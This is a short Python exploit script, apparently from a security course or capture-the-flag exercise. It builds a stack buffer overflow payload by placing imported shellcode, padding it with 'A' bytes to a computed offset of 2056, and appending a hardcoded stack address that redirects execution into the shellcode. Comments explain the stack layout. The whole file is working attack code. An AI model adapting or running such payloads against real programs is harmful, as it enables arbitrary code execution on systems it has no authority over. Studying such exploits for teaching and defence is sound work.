#!/usr/bin/env python3

import sys

from shellcode import shellcode
buf_addr = 0x7ffffff6acc0  
offset = 2056
#shellcode is at rbp-0x810 = rbp - 2064
#p is at rbp-0x8 = rbp - 8 so we need 2056 bytes of padding + shellcode before we put in the address into p 

payload = shellcode 
payload += b'A' * (offset - len(shellcode)) #distance to the return address in memory fill with padding
payload += buf_addr.to_bytes(8, 'little')

sys.stdout.buffer.write(payload)
